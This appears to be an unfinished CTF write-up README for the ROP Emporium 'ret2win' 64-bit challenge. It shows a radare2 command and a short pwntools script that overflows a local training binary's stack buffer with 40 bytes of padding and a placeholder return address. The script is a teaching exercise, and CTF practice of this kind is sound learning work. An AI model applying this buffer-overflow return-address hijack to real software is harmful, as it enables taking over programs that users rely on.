# CTF-2020

> ## [ROP EMPORIUM](#rop)
>
> - [Ret2Win 64 bit](#ret2win)





## ROP EMPORIUM<a name="rop"></a>

***

### RET2WIN64<a name="ret2win"></a>

> For this first challenge I needed to issue the command `$ r2 ret2win`
>
>> This is just an example of nested block quotes 

![First image](https://github.com/jpowellroot/CTF-2020/blob/master/2-1.png?raw=true)

##### payload

~~~ python
#/usr/bin/env python

from pwn import *

elf = context.binary = ELF('ret2win')
context.log_level = 'debug'

padding = cyclic(40)
ret2win = p64(0xdeadbeef)

payload = padding + ret2win

io = process(elf.path)
io.sendline(payload)
io.recvall()
~~~
